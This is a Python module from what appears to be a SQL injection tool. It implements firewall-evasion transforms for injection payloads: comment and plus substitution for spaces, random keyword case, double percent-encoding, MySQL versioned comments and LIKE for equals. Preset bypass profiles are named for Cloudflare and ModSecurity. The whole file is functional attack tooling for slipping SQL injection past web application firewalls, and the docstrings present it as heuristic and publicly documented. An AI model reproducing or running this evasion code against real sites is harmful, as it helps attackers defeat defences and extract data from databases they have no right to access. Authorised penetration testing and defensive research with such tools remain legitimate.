"""WAF-evasion payload transformations ("tampers"), manual selection only.

These apply heuristic, publicly documented evasion techniques -- the same
style sqlmap's own ``--tamper`` scripts use: comment-based space
substitution, SQL keyword case randomization, percent-encoding, MySQL
versioned comments, and so on. They are composed on top of an existing
``PayloadBuilder`` without changing it, same adapter pattern already used by
``BooleanPayloadBuilder``/``TimePayloadBuilder``/``ConditionalErrorPayloadBuilder``.

Nothing here is a guarantee against any specific commercial WAF: rulesets
change constantly, and the "profiles" below are heuristic combinations drawn
from publicly known bypass categories, not a verified bypass of a named
product. Always confirm with ``--verbose`` that extraction still behaves
correctly end to end after enabling a tamper.
"""

import random
import re
from abc import ABC, abstractmethod
from collections.abc import Sequence
from dataclasses import dataclass, field
from typing import ClassVar
from urllib.parse import quote

from .contracts import PayloadBuilder


class Tamper(ABC):
    """A single, reversible-in-intent transformation of a payload string."""

    name: ClassVar[str]

    @abstractmethod
    def apply(self, payload: str) -> str:
        """Return a transformed payload that an unmodified target still accepts."""
        raise NotImplementedError


@dataclass(frozen=True, slots=True)
class SpaceToCommentTamper(Tamper):
    """Replace literal spaces with an inline comment: a classic evasion
    against signatures that look for whitespace-separated SQL keywords."""

    name: ClassVar[str] = "space2comment"

    def apply(self, payload: str) -> str:
        return payload.replace(" ", "/**/")


@dataclass(frozen=True, slots=True)
class SpaceToPlusTamper(Tamper):
    """Replace literal spaces with "+" (relies on query-string decoding)."""

    name: ClassVar[str] = "space2plus"

    def apply(self, payload: str) -> str:
        return payload.replace(" ", "+")


_SQL_KEYWORDS = (
    "SELECT", "AND", "OR", "UNION", "FROM", "WHERE", "CASE", "WHEN", "THEN",
    "ELSE", "END", "SUBSTRING", "SUBSTR", "ASCII", "LENGTH", "SLEEP",
    "WAITFOR", "DELAY", "LIKE", "NULL", "IF",
)
_KEYWORD_PATTERN = re.compile(
    "|".join(re.escape(keyword) for keyword in _SQL_KEYWORDS), re.IGNORECASE
)


@dataclass(frozen=True, slots=True)
class RandomCaseTamper(Tamper):
    """Randomize the case of common SQL keywords in the payload.

    Many naive WAF signatures only match a keyword's all-lowercase or
    all-uppercase spelling. ``rng`` is injectable for deterministic tests.
    """

    name: ClassVar[str] = "randomcase"
    rng: random.Random = field(default_factory=random.Random)

    def apply(self, payload: str) -> str:
        def _randomize(match: re.Match[str]) -> str:
            return "".join(
                char.upper() if self.rng.random() < 0.5 else char.lower()
                for char in match.group(0)
            )

        return _KEYWORD_PATTERN.sub(_randomize, payload)


@dataclass(frozen=True, slots=True)
class CharEncodeTamper(Tamper):
    """Percent-encode every character of the payload."""

    name: ClassVar[str] = "charencode"

    def apply(self, payload: str) -> str:
        return quote(payload, safe="")


@dataclass(frozen=True, slots=True)
class DoubleEncodeTamper(Tamper):
    """Percent-encode the payload twice (defeats a single decode pass)."""

    name: ClassVar[str] = "doubleencode"

    def apply(self, payload: str) -> str:
        return quote(quote(payload, safe=""), safe="")


@dataclass(frozen=True, slots=True)
class VersionedCommentTamper(Tamper):
    """Wrap the payload in a MySQL version-gated comment (``/*!50000 ... */``).

    MySQL executes the comment's contents when its version satisfies the
    gate; many WAF parsers treat the whole block as inert. MySQL-specific.
    """

    name: ClassVar[str] = "versionedcomment"

    def apply(self, payload: str) -> str:
        return f"/*!50000{payload}*/"


_BARE_EQUALS = re.compile(r"(?<![<>=!])=(?!=)")


@dataclass(frozen=True, slots=True)
class EqualsToLikeTamper(Tamper):
    """Replace a bare "=" with " LIKE ".

    Safe for the ASCII-integer comparisons this project builds (no LIKE
    wildcards ever appear in the compared value); keep that caveat in mind
    if this tamper is ever reused against a different kind of condition.
    """

    name: ClassVar[str] = "equaltolike"

    def apply(self, payload: str) -> str:
        return _BARE_EQUALS.sub(" LIKE ", payload)


_TAMPER_CLASSES: dict[str, type[Tamper]] = {
    tamper_class.name: tamper_class
    for tamper_class in (
        SpaceToCommentTamper,
        SpaceToPlusTamper,
        RandomCaseTamper,
        CharEncodeTamper,
        DoubleEncodeTamper,
        VersionedCommentTamper,
        EqualsToLikeTamper,
    )
}

# Heuristic combinations drawn from publicly documented bypass categories.
# Not a verified bypass of any specific product's current ruleset.
TAMPER_PROFILES: dict[str, tuple[str, ...]] = {
    "generic-waf": ("space2comment", "randomcase"),
    "cloudflare": ("space2comment", "randomcase", "charencode"),
    "modsecurity": ("space2comment", "versionedcomment", "randomcase"),
}


def available_tampers() -> tuple[str, ...]:
    """Return every registered tamper name, sorted."""
    return tuple(sorted(_TAMPER_CLASSES))


def available_profiles() -> tuple[str, ...]:
    """Return every registered tamper-profile name, sorted."""
    return tuple(sorted(TAMPER_PROFILES))


def build_tamper(name: str) -> Tamper:
    """Instantiate one tamper by its registered name."""
    try:
        return _TAMPER_CLASSES[name]()
    except KeyError:
        raise ValueError(
            f"Unknown tamper: {name!r}. Available: {', '.join(available_tampers())}"
        ) from None


def resolve_tampers(names_and_profiles: Sequence[str]) -> tuple[str, ...]:
    """Expand profile names into concrete tamper names and dedupe, in order.

    Each item may be a single tamper name or a profile name; profiles expand
    to their member tampers. Raises ``ValueError`` naming the offending item
    if it matches neither a tamper nor a profile.
    """
    resolved: list[str] = []
    for item in names_and_profiles:
        item = item.strip()
        if not item:
            continue
        names = TAMPER_PROFILES.get(item, (item,))
        for name in names:
            if name not in _TAMPER_CLASSES:
                raise ValueError(
                    f"Unknown tamper or profile: {item!r}. "
                    f"Available tampers: {', '.join(available_tampers())}; "
                    f"profiles: {', '.join(available_profiles())}"
                )
            if name not in resolved:
                resolved.append(name)
    return tuple(resolved)


@dataclass(frozen=True, slots=True)
class TamperingPayloadBuilder(PayloadBuilder):
    """Wrap any ``PayloadBuilder``, applying a tamper chain to its output."""

    inner: PayloadBuilder
    tampers: tuple[Tamper, ...]

    def build(self, condition: str) -> str:
        payload = self.inner.build(condition)
        for tamper in self.tampers:
            payload = tamper.apply(payload)
        return payload
